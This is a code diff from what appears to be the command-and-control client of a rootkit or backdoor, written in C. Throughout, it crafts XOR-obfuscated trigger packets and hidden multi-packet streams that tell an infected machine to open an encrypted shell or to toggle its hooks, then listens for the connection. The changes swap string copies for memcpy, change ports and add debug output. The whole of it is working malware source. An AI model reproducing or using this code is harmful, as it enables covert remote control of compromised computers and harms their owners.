@@ -220,25 +220,25 @@ void activate_command_control_shell_encrypted(char* argv){
     //K3 with command to start the encrypted connection with the backdoor
     char key3[CC_TRIGGER_SYN_PACKET_SECTION_LEN+1] = CC_TRIGGER_SYN_PACKET_KEY_3_ENCRYPTED_SHELL;
     char result[CC_TRIGGER_SYN_PACKET_SECTION_LEN];
-    strncpy(section, payload, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
+    memcpy(section, payload, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
     for(int ii=0; ii<CC_TRIGGER_SYN_PACKET_SECTION_LEN; ii++){
         result[ii] = section[ii] ^ key1[ii];
     }
-    strncpy(payload+0x06, result, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
+    memcpy(payload+0x06, result, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
 
-    strncpy(section, payload+0x02, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
+    memcpy(section, payload+0x02, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
     for(int ii=0; ii<CC_TRIGGER_SYN_PACKET_SECTION_LEN; ii++){
         result[ii] = section[ii] ^ key2[ii];
     }
-    strncpy(payload+0x0A, result, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
+    memcpy(payload+0x0A, result, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
 
-    strncpy(section, payload+0x06, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
-    strncpy(section2, payload+0x0A, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
+    memcpy(section, payload+0x06, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
+    memcpy(section2, payload+0x0A, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
     for(int ii=0; ii<CC_TRIGGER_SYN_PACKET_SECTION_LEN; ii++){
         result[ii] = section[ii] ^ section2[ii] ^ key3[ii];
     }
 
-    strncpy(payload+0x0C, result, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
+    memcpy(payload+0x0C, result, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
     
     
     packet_t packet = build_standard_packet(8000, 9000, local_ip, argv, 4096, payload);
@@ -274,30 +274,30 @@ void hook_control_command(char* argv, int mode){
     char key3[CC_TRIGGER_SYN_PACKET_SECTION_LEN+1];
     //K3 with command to start the encrypted connection with the backdoor
     if(mode == 0){
-        strncpy(key3, CC_TRIGGER_SYN_PACKET_KEY_3_HOOK_DEACTIVATE_ALL, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
+        memcpy(key3, CC_TRIGGER_SYN_PACKET_KEY_3_HOOK_DEACTIVATE_ALL, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
     }else{
-        strncpy(key3, CC_TRIGGER_SYN_PACKET_KEY_3_HOOK_ACTIVATE_ALL, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
+        memcpy(key3, CC_TRIGGER_SYN_PACKET_KEY_3_HOOK_ACTIVATE_ALL, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
     }
     char result[CC_TRIGGER_SYN_PACKET_SECTION_LEN];
-    strncpy(section, payload, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
+    memcpy(section, payload, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
     for(int ii=0; ii<CC_TRIGGER_SYN_PACKET_SECTION_LEN; ii++){
         result[ii] = section[ii] ^ key1[ii];
     }
-    strncpy(payload+0x06, result, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
+    memcpy(payload+0x06, result, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
 
-    strncpy(section, payload+0x02, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
+    memcpy(section, payload+0x02, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
     for(int ii=0; ii<CC_TRIGGER_SYN_PACKET_SECTION_LEN; ii++){
         result[ii] = section[ii] ^ key2[ii];
     }
-    strncpy(payload+0x0A, result, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
+    memcpy(payload+0x0A, result, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
 
-    strncpy(section, payload+0x06, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
-    strncpy(section2, payload+0x0A, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
+    memcpy(section, payload+0x06, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
+    memcpy(section2, payload+0x0A, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
     for(int ii=0; ii<CC_TRIGGER_SYN_PACKET_SECTION_LEN; ii++){
         result[ii] = section[ii] ^ section2[ii] ^ key3[ii];
     }
 
-    strncpy(payload+0x0C, result, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
+    memcpy(payload+0x0C, result, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
     
     packet_t packet = build_standard_packet(8000, 9000, local_ip, argv, 4096, payload);
     printf("["KBLU"INFO"RESET"]""Sending malicious packet to infected machine...\n");
@@ -318,7 +318,7 @@ void activate_command_control_shell_encrypted_multi_packet(char* argv){
     printf("["KBLU"INFO"RESET"]""Crafting malicious packet stream...\n");
     
     //Stream of 3 packets, 4 bytes on each if using sequence numbers for hiding the payload
-    stream_t stream = build_standard_packet_stream_empty_payload(CC_STREAM_TRIGGER_PAYLOAD_LEN/CC_STREAM_TRIGGER_PACKET_CAPACITY_BYTES, 8000, 9000, local_ip, argv);
+    stream_t stream = build_standard_packet_stream_empty_payload(CC_STREAM_TRIGGER_PAYLOAD_LEN/CC_STREAM_TRIGGER_PACKET_CAPACITY_BYTES, 8500, 9000, local_ip, argv);
     char *payload = calloc(CC_STREAM_TRIGGER_PAYLOAD_LEN, sizeof(char));
     srand(time(NULL));
     for(int ii=0; ii<CC_STREAM_TRIGGER_PAYLOAD_LEN; ii++){
@@ -326,15 +326,22 @@ void activate_command_control_shell_encrypted_multi_packet(char* argv){
     }
     inet_pton(AF_INET, argv, (void*)(payload+0x01));
     uint16_t port = htons(8000);
-    strncpy(payload+0x05, (char*)&port, 0x02);
-    char result[0x02];
+    memcpy(payload+0x05, (char*)&port, 0x02);
+    char result[0x03];
     char key[0x03] = CC_STREAM_TRIGGER_KEY_ENCRYPTED_SHELL;
     for(int ii=0; ii<0x02; ii++){
         result[ii] = payload[0x05+ii] ^ key[ii];
+        printf("R:%x, P5:%x, K3:%x\n", result[ii], payload[0x05+ii], key[ii]);
     }
-    strncpy(payload+0x08, result, 0x02);
-    uint16_t crc = crc16(payload, 10);
-    strncpy(payload+0x0A, (char*)&crc, 0x02);
+    printf("Payload before XOR: ");
+    for(int ii=0; ii<CC_STREAM_TRIGGER_PAYLOAD_LEN; ii++){
+        printf("%x ", payload[ii]);
+    }
+    printf("\n");
+    memcpy(payload+0x08, result, 0x02);
+    char* payload_p = payload;
+    uint16_t crc = crc16(payload_p, 10);
+    memcpy(payload+0x0A, (char*)&crc, 0x02);
     printf("Payload before XOR: ");
     for(int ii=0; ii<CC_STREAM_TRIGGER_PAYLOAD_LEN; ii++){
         printf("%x ", payload[ii]);
@@ -343,12 +350,12 @@ void activate_command_control_shell_encrypted_multi_packet(char* argv){
     //Rolling xor
     for(int ii=1; ii<CC_STREAM_TRIGGER_PAYLOAD_LEN; ii++){
         char xor_res = payload[ii-1] ^ payload[ii];
-        strncpy(payload+ii, (char*)&(xor_res), 0x01);
+        memcpy(payload+ii, (char*)&(xor_res), 0x01);
     }
 
     printf("Payload after XOR: ");
     for(int ii=0; ii<CC_STREAM_TRIGGER_PAYLOAD_LEN; ii++){
-        printf("%x", payload[ii]);
+        printf("%x ", payload[ii]);
     }
     printf("\n");
 
@@ -371,7 +378,7 @@ void activate_command_control_shell_encrypted_multi_packet(char* argv){
     }
     printf("["KGRN"OK"RESET"]""Packet stream successfully sent to the backdoor in completeness\n");
     
-    server_run(8000);
+    server_run(8500);
 }
 
 
